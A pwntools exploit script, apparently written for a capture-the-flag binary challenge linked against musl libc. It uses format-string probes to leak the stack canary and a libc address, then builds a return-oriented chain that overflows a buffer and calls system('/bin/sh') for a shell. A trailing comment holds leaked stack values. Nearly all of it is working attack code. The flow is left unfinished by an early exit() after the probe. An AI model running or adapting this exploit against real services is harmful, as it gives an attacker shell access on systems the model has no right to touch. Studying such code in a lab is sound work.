#!/usr/bin/python3
from pwn import *

# Switch between local/GDB/remote from terminal 
def initIO():
    if (args.REMOTE):   # ("server", port)
        return remote(sys.argv[1], sys.argv[2])
    else:               # Run locally
        return ELF.process()

libc = context.binary = ELF('./musl_1.2.3-1_amd64.so')
rop = ROP(libc)
context.log_level = "debug"

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = initIO()

check_canary = b''
for i in range(71, 101):
    check_canary += b'%' + str(i).encode() + b'$p '

io.sendline(check_canary)

io.interactive()

exit()

io.sendline(b'%45$p %49$p')

io.recvuntil(b'0x')

value = io.recvline().strip().split(b' ')
print(value)
canary_value = int(value[0], 16)
libc_addr = int(value[1], 16) - libc.symbols['__libc_start_main'] 

print(hex(canary_value))
print(hex(libc_addr))
print(hex(libc.symbols['__libc_start_main']))


libc.address = libc_addr
pop_rdi = (rop.find_gadget(['pop rdi', 'ret']))[0] + libc.address
ret = pop_rdi + 1
binsh = next(libc.search(b"/bin/sh"))
system = libc.sym['system']
exits = libc.sym['exit']

print(hex(libc.address + pop_rdi))
print(hex(binsh))
print(hex(system))

offset = 72

payload = flat(
    b'A' * offset,
    canary_value,
    b'A' * 8,
    ret,
    pop_rdi,
    binsh,
    system,
)

io.sendline(payload)

io.interactive()

# b'0x21e7f4dec4711b00 (nil) 0x7f0efb2bfe40 0x7ffda3847268 0x55a911cfeda0 0x7f0efb4fd2e0 (nil) (nil) 0x55a911cfc0e0 0x7ffda3847250 (nil) (nil) 0x55a911cfc105 0x7ffda3847248 0x1c 0x1 0x7ffda3847eb1 (nil) 0x7ffda3847eb9 0x7ffda3847ed2 0x7ffda3847edc 0x7ffda3847ee8 0x7ffda3847ef1 0x7ffda3847efe 0x7ffda3847f0c 0x7ffda3847f16 \n'
